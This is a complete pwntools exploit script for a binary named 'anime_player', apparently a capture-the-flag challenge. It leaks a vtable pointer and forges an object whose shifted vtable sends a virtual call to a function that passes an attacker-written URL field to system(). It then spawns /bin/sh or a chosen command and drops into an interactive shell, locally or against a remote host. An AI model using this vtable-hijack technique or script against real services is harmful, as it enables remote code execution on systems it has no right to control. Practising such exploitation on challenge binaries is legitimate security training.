#!/usr/bin/env python3
from pwn import *


exe = context.binary = ELF("./anime_player", checksec=False)
context.log_level = args.LOG_LEVEL or "info"


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(exe.path)


def menu(io, choice):
    io.sendlineafter(b"Choice > ", str(choice).encode())


def add_anime(io, title=b"probe", episode=b"1", url=b"https://x"):
    menu(io, 1)
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Episode: ", episode)
    io.sendlineafter(b"URL: ", url)


def export(io, idx):
    menu(io, 7)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Object Address: ")
    obj = int(io.recvline(), 16)
    io.recvuntil(b"Vtable Pointer: ")
    vtable = int(io.recvline(), 16)
    return obj, vtable


def add_raw(io, vptr, slot0=0, slot1=0):
    menu(io, 2)
    # These three values are parsed with std::hex.
    io.sendlineafter(b"Target Vtable Ptr (hex): 0x", f"{vptr:x}".encode())
    io.sendlineafter(b"Slot 0 (hex): 0x", f"{slot0:x}".encode())
    io.sendlineafter(b"Slot 1 (hex): 0x", f"{slot1:x}".encode())


def update_url(io, idx, command):
    menu(io, 6)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"New URL: ", command)


def main():
    io = start()

    # Leak PIE from a genuine AnimeStream object's vptr.
    add_anime(io)
    obj, vtable = export(io, 0)
    log.info(f"anime object = {obj:#x}")
    log.info(f"AnimeStream vptr = {vtable:#x}")

    # A base calculation works for the supplied local build, but is not
    # needed by the exploit.  Keeping everything vtable-relative also makes
    # this work when the service binary has slightly different ELF offsets.
    local_base_guess = vtable - exe.sym["_ZTV11AnimeStream"] - 0x10
    if local_base_guess & 0xfff == 0:
        log.success(f"PIE base (local layout) = {local_base_guess:#x}")
    else:
        log.info("service ELF layout differs; using the relative vtable offset")

    # The real table contains execute_stream at vptr+0x20.  Give the raw
    # object a shifted vptr so play_media's vptr[1] resolves to it:
    #     fake_vptr + 8 == real_vptr + 0x20
    shifted_vptr = vtable + 0x18
    add_raw(io, shifted_vptr)

    # update_anime_url has no dynamic type check and writes at object+0x5c.
    # execute_stream passes that exact field to system().
    command = args.CMD.encode() if args.CMD else b"/bin/sh"
    if len(command) > 27:
        log.warning("command exceeds the raw object's allocation (27 safe bytes)")
    update_url(io, 1, command)

    menu(io, 4)
    io.sendlineafter(b"Index: ", b"1")
    io.interactive()


if __name__ == "__main__":
    main()
